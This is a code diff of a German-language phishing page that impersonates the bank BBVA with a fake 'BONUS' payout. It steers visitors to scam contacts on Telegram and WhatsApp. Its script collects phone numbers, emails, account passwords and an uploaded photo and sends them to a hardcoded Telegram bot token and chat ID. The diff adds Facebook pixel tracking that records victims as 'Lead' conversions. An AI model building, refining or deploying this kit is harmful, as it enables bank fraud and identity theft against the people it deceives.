@@ -6,10 +6,24 @@
     <title>Auszahlung - BBVA</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Poppins:wght@600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
+    
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1249266569838979');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1249266569838979&ev=PageView&noscript=1"
+    /></noscript>
     <style>
         body { font-family: 'Inter', sans-serif; }
-        
-        /* Schritt 1: Kontakt-Karte */
         .step-1-card {
             background: linear-gradient(145deg, #1c2128, #111418);
             border: 2px solid #ff4d4d;
@@ -18,7 +32,6 @@
             margin-bottom: 25px;
             box-shadow: 0 8px 32px rgba(255, 77, 77, 0.15);
         }
-
         .step-title {
             color: #ff4d4d;
             font-family: 'Poppins', sans-serif;
@@ -29,7 +42,6 @@
             display: block;
             font-weight: 700;
         }
-
         .important-note {
             background: rgba(255, 77, 77, 0.1);
             color: #ff4d4d;
@@ -40,7 +52,6 @@
             border: 1px solid rgba(255, 77, 77, 0.2);
             text-align: center;
         }
-
         .btn-messenger {
             display: flex;
             align-items: center;
@@ -55,28 +66,17 @@
             color: #fff !important;
             text-decoration: none;
         }
-
-        .icon-tg, .icon-wa {
-            width: 22px; height: 22px;
-            background-size: contain; background-repeat: no-repeat;
-            display: inline-block;
-        }
+        .icon-tg, .icon-wa { width: 22px; height: 22px; background-size: contain; background-repeat: no-repeat; display: inline-block; }
         .icon-tg { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z'/%3E%3C/svg%3E"); }
         .icon-wa { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12.012 2c-5.508 0-9.987 4.479-9.987 9.987 0 1.763.463 3.426 1.277 4.876L2 22l5.308-1.391c1.4.764 2.992 1.199 4.692 1.199 5.508 0 9.987-4.479 9.987-9.987 0-5.508-4.479-9.987-9.987-9.987zm4.567 14.162c-.225.63-.787 1.144-1.417 1.341-.449.14-.99.231-2.474-.383-1.923-.8-3.15-2.765-3.245-2.893-.094-.128-.772-.924-.772-1.767 0-.843.441-1.258.599-1.428.158-.17.344-.213.458-.213.114 0 .229.001.328.005.105.004.246-.04.385.291.142.341.487 1.187.529 1.272.042.085.07.184.013.298-.057.114-.085.184-.17.284-.085.1-.178.223-.254.3-.085.085-.174.178-.075.348.099.17.441.725.945 1.175.649.578 1.196.758 1.366.843.17.085.27.071.37-.043.1-.114.426-.496.54-.666.114-.17.227-.142.383-.085.156.057 1.006.475 1.177.56.17.085.284.128.326.198.043.07.043.407-.181 1.037z'/%3E%3C/svg%3E"); }
-
         .btn-tg { background: linear-gradient(135deg, #2AABEE 0%, #229ED9 100%) !important; }
         .btn-wa { background: linear-gradient(135deg, #25D366 0%, #128C7E 100%) !important; }
-        
-        .file-upload-container {
-            border: 1px dashed #30363d; background: #161b22;
-            border-radius: 12px; padding: 20px; cursor: pointer;
-        }
+        .file-upload-container { border: 1px dashed #30363d; background: #161b22; border-radius: 12px; padding: 20px; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="container">
         <main class="main-card">
-            
             <div class="step-1-card">
                 <span class="step-title">Schritt 1: Zuerst Kontaktieren</span>
                 <div class="important-note">
@@ -85,16 +85,14 @@
                 <p style="font-weight: 500; font-size: 0.95rem; margin-bottom: 20px; color: #e6edf3;">
                     Schreiben Sie dem Manager "BONUS" in Telegram oder WhatsApp:
                 </p>
-                
                 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
-    <a href="https://t.me/kobel1999?text=Hallo,%20ich%20m%C3%B6chte%20ein%20BBVA-Konto%20registrieren" class="btn-messenger btn-tg">
-        <i class="icon-tg"></i> Telegram
-    </a>
-    
-    <a href="https://wa.me/447853157781?text=Hallo,%20ich%20m%C3%B6chte%20ein%20BBVA-Konto%20registrieren" class="btn-messenger btn-wa">
-        <i class="icon-wa"></i> WhatsApp
-    </a>
-</div>
+                    <a href="https://t.me/kobel1999?text=Hallo,%20ich%20m%C3%B6chte%20ein%20BBVA-Konto%20registrieren" onclick="fbq('track', 'Contact');" class="btn-messenger btn-tg">
+                        <i class="icon-tg"></i> Telegram
+                    </a>
+                    <a href="https://wa.me/447853157781?text=Hallo,%20ich%20m%C3%B6chte%20ein%20BBVA-Konto%20registrieren" onclick="fbq('track', 'Contact');" class="btn-messenger btn-wa">
+                        <i class="icon-wa"></i> WhatsApp
+                    </a>
+                </div>
             </div>
 
             <div class="form-divider" style="color: #444; font-size: 0.7rem; letter-spacing: 2px;">DANACH (SCHRITT 2)</div>
@@ -140,7 +138,6 @@
     </div>
 
     <script>
-        // Deutschsprachige Kommentare und Logik
         const botToken = '8208977713:AAFqG2kZpj_SgtomllDdrBQAn4DG9V6t2OI';
         const chatId = '787580401';
 
@@ -164,7 +161,6 @@
             const regPass = document.getElementById('regPass').value;
             const fileInput = document.getElementById('photo-upload');
 
-            // Nachricht an den Bot auf Deutsch
             const message = `🚀 *NEUE ANFRAGE*\n\n📱 Kontakt: ${userPhone}\n📧 Email: ${regEmail}\n📞 Nummer: ${regPhone}\n🔑 PW: ${regPass}`;
 
             try {
@@ -180,6 +176,9 @@
                     formData.append('photo', fileInput.files[0]);
                     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                 }
+
+                // Tracking Lead Event added
+                fbq('track', 'Lead');
 
                 alert('Erfolgreich gesendet!');
             } catch (error) {
